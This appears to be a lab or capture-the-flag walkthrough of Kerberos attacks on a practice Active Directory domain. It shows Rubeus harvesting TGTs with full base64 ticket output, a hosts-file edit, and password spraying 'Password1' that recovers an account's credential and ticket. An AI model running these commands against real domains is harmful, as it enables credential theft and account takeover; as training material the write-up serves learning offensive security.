
# Harvesting Tickets with `Rubeus` - 

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the `pass the ticket attack.`


controller\administrator@CONTROLLER-1 C:\Users\Administrator> `cd Downloads`
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`dir`
 Volume in drive C has no label.
 Volume Serial Number is E203-08FF

 Directory of C:\Users\Administrator\Downloads

05/25/2020  03:45 PM    <DIR>          .
05/25/2020  03:45 PM    <DIR>          ..
05/25/2020  03:45 PM         1,263,880 mimikatz.exe
05/25/2020  03:14 PM           212,480 Rubeus.exe
               2 File(s)      1,476,360 bytes
               2 Dir(s)  50,892,767,232 bytes free

    

# `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for `TGT`s every 30 seconds

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`Rubeus.exe harvest /interval:30`

   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Harvesting (with auto-renewal) 
[*] Monitoring every 30 seconds for new TGTs
[*] Displaying the working TGT cache every 30 seconds


[*] Refreshing TGT ticket cache (4/20/2024 5:52:32 AM)

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
  StartTime             :  4/20/2024 2:56:01 AM
  EndTime               :  4/20/2024 12:56:01 PM
  RenewTill             :  4/27/2024 2:56:01 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable 
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEpiemNAt4L/G8+0weqQJ0N8R/xqSfGSIEJk2
    rfhb43HEpNiX3IrQYJc1pvfav7wkN/1Loiahmt0RCMCvgHVBZBpPq+WIs88KRVMKxmqqEREzyITKcPdSTu/ktvr69hhnnh+eUraf
    gujYvn+T5s972wdGkMoaccaYbBCZjMD4cKeilqF48JDo00PR/T2fgPoTex3y6C1kbB1rzoEmgwKxx7wgEteEDvqJhLDhygy1LV53
    HVyf3DgvD4GDQlbgytc1IJ3yvx2yEZixUlU4qlLOJAuGQJgFU+lX13DkU2GIPQ0BtG9UPsM7ndtPFHZD3C9GJ26EtUpHgGK6Dh7u
    WUqMTfpDwXR88DIiWzAn2CqVgh+GnleAAYf1mvpYUW0HpWKsrUMsLPBlVNPnKrkxkNSqfaB8m2WIDQaX290EzcegWll3U+uw/5Ek
    lXA4brN8CXx8tcOEAPwNxh/2fntlt3WKQc2grW0ONVXLjq7ObmS9WkUFQq/lvGOf9BslLWtgBN9XejR9zKaq8AoNrfyOjl+IISKy
    y7iz95uEsoEa6tWDa9xOq2zPJpSKrrzoBox0mTG+lGsdplTy9ueYcek4Im8UY89km2mckdgMGSd15leldMnTd4YHGE2rLwKyJhiU
    9FqgoNpoUEM+OFMZbcICa8gxvI7Ng6OYPDDOQLzGADVl9dbxgg0sDeQPW6/fTCZfkWhaTGjr6Pi1+8ulcs9bkYDr+ryF9mgP1FIc
    FFL2aRTsPikUy0GrWHmeWoGtmeQ2OyyGAl5d+x6e2OnZJvMT1Q57oQ+bQPWDTta/XXW7A0sy0qXro/Gfw7vInowJQAn2xm2VYNmR
    s1dS2OIKaBqh75W/8CkscZlMRRwWmLozK0k017/RTeISST4PRPNZDaOQTqmjtBs0P5cM8JXdSc1C9mku7Yl46Co/+LnmK+567L1/
    S+e2nAYrKJ0bh3Yk2amHNZq9h8t+QGXRV5WspVtPk2Qp35WcjMUJp9XH1kBwp9V5UFIa5bYyJycsVt5dAvBUbEH4EhPgTbSb8H0h
    wJRU9NzFqYHWNGzcufILZgxDAw67uNQ4UotLHALqH66gm8KogX40IYmyL79rJvvZz57o8YBIWnqFAoVa4MvWTOHrU94Fmwp8zi2r
    ZJoTvAbHU1tvyYUHNEMrYQwinvi1znV2VGUKw6SX/I/kUYx1aHM6c+unl2sGM73NRNXMwQNmRe/M9vT9qnRmWaJzfVACCPsLKJhn
    blt64twGKzNEVuNtTxPCim1HMD5/0J3St+vT9ZrrZhLt93+p3z5lF8kotFtc/1VlACJaR9SaGk19lqItXl+6NjDkGJB7YnY7JoUX
    bKxCHHmxArogDL21Spuo4jQrVS7v4ILvtdPMHdPEw07/cMQGLxmNXg+jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCCRVu/Z1UnZt4esHj5jKe5ICuHrKbBQD8oMkbwnpao0OKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDI0MDQyMDA5NTYwMVqmERgPMjAyNDA0MjAxOTU2MDFapxEYDzIwMjQwNDI3
    MDk1NjAxWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM


# Brute-Forcing and Password-Spraying with Rubeus

Rubeus can do both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

1. `Password Spraying` with Rubeus

# R`ubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`Rubeus.exe brute /password:Password1 /noticket`

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[X] Error resolving hostname 'CONTROLLER.local' to an IP address: No such host is known

[X] Unable to get domain controller address


# Lets add it to host file and try again

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`echo 10.10.229.169 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>`Rubeus.exe brute /password:Password1 /noticket`

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7dCH/kbXBrRbj69wpAUgslttjYazsyWvxjRAiPU3fOnFQNGE7dEc9Iy9hYNpeKy4scHzytN03SkJ
      xd6F2XD6U35xObfbkfyUGzjpQ0LOo5oYGa4ZmK2P50tRBl5at8u7fYrqxtaAa2/4BNEuL8Xc8PUPPtV/
      neezK07fBldxf6Kl7MTS2MMApXlzjeTMyZeH+fBa2mxzIWov0kX2yJLDN9Rx9yAkX/ApgY4E9J9Hixkp
      RIy5dXYMdOZOdT7qsEe2/0U5R4B0KH15GYmfkzlxHKlx6Ni8ReO3WmGf/b4JU1fZbd174mbobbyzRlYA
      R46iZ+JPel3GPvvvTboYBXKVALeyg2gwUkAnta1/ccMT4Nu2Zv1JThhB0YQ3OiywjbREiAZNsyIeVTBE
      tpADNuKigtZWHmO+irHm98jFamaLisQ/04+cpmoHLqpq3EVnw2RryDlAuBTargSLKClYjhgzN/qyrvRm
      FnpWCeIbnwvdFmzWQwScmHdjRCGreZWO/uQdv3eufoHmsJuSKmQ9rHVle324prCK/RRmO80IYDYwiFcc
      mSPcOQmSgeniuSKSRKs0pnz9jbhAr3zK8rDilOL8CpBSD0+DI9buj9YRFjxiY2bOm+Cb4Ip+QNDci7wk
      jV5tgvcRr2sJRlUqi0yr+Xz0bd8ECvTLf6oefKi90cHFNH83L93N5SueLxET1+I4FCfDc357Z1moTpoW
      HdXWRvGjYUzkpYwT7brjqMLVb0+kvewI4X3kQP28kfYf5Ltqr5dtEZpeIDVFCuiEYoOIAHaFgU9j7RPe
      8xJmxDFsdXDnBPHamCYPck4NYn0asC5Dm6uKcC3JZwkDTI9PdtbmBvUNY37It1kEWb8PDHqR+DsxvQgn
      /HIAihiabrfkhpLr7miIae/vb/DEFUhPrlRL8tqoNf+fzDvWJuiuKxMDodIoXwQBLYtRkS85L+tT6G2+
      tqRax/kZEXHuCSDbi4qwxtOQlHadEUCtow9yHQML3rE6hlAyl7WKo5IlOCikRHeWTeEevM3qbXNFp3ub
      WqJ4tvU3W6CMPTOIkWdOhdwqOO21LsvFvjjSCFCQ9MaoS4Ss7lP3iVqfvPQF+Ue9+E0nqzpi+eIFFjGp
      LLSZtTseAgB8rtKxNJObQGofjbP78LzR0VkaBLibPIUQ7QuqffViGXG9e2iUm961gxhPYdyRxj5CAV9y
      qHQXc290ZmHbbQdbFy4G7CZdDqgD/e3bJ0I1qmJ7qDufHbkEwOvZo1oisq4fF3BY0/WAnvW7gQS8mdsD
      hQmDJXruYo1OJ/+Xeh6NRMS3CgBNoos9EC610YqvOF2ErY3aCb/LUubDoaZdD4uma6OB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIHKziKYW16qaH6qYTFzkklF7U0hXCajRAQBF
      pYKAdEuwoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDI0MDQyMDEyNTkzN1qmERgPMjAyNDA0MjAyMjU5MzdapxEYDzIwMjQwNDI3MTI1OTM3WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done


controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>


We got the user which has Password1

NOTE - This attack may lock you out of the network depending on the account lockout policies.